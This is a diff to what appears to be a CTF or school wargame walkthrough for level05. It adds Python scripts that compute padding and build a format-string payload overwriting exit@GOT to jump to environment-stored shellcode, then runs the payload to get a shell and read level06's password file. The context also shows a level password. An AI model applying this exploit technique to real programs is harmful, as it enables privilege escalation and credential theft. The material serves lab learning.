@@ -137,3 +137,103 @@ cat /home/users/level06/.pass
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
 
+### Display the Shellcode address at VM machine at School:
+
+### 1. Compile a helper to read the env address
+Do the command as above and:
+```bash
+/tmp/ge SHELLCODE
+```
+Note the address: 0xffff1596.
+
+### 2. Use `calc.py` to compute paddings
+
+```bash
+cat > /tmp/calc.py << 'EOF'
+import sys
+
+addr = int(sys.argv[1], 16)
+low  = addr & 0xffff
+high = (addr >> 16) & 0xffff
+
+if low < high:
+    first, second = low, high
+    order = "LOW_FIRST"
+else:
+    first, second = high, low
+    order = "HIGH_FIRST"
+
+padding1 = first - 8
+padding2 = second - first
+
+print("addr = 0x%x" % addr)
+print("low  = 0x%x" % low)
+print("high = 0x%x" % high)
+print("order:", order)
+print("padding1 =", padding1)
+print("padding2 =", padding2)
+EOF
+```
+
+Run it with the address (without `0x`):
+
+```bash
+python /tmp/calc.py ffff1596
+```
+
+Note `padding1` and `padding2` (for our VM we got `5518` and `60009`).
+
+---
+
+### 3. Generate the format‑string payload
+
+```bash
+cat > /tmp/payload.py << 'EOF'
+import sys
+
+padding1 = int(sys.argv[1])
+padding2 = int(sys.argv[2])
+
+got_low  = "\xe0\x97\x04\x08"   # exit@GOT
+got_high = "\xe2\x97\x04\x08"   # exit@GOT + 2
+
+s = got_low + got_high
+s += "%%%dd%%10$hn" % padding1
+s += "%%%dd%%11$hn" % padding2
+
+sys.stdout.write(s)
+EOF
+```
+
+Then:
+
+```bash
+python /tmp/payload.py 5518 60009 > /tmp/payload.bin
+```
+
+(Replace the numbers with whatever `calc.py` prints on our VM.)
+
+---
+
+### 4. Trigger the exploit and get an interactive shell
+
+```bash
+(cat /tmp/payload.bin; cat) | ./level05
+```
+
+Then, at the prompt that comes back:
+
+```bash
+whoami
+cat /home/users/level06/.pass
+```
+
+We should see:
+
+```bash
+level06
+<the flag>
+```
+
+
+
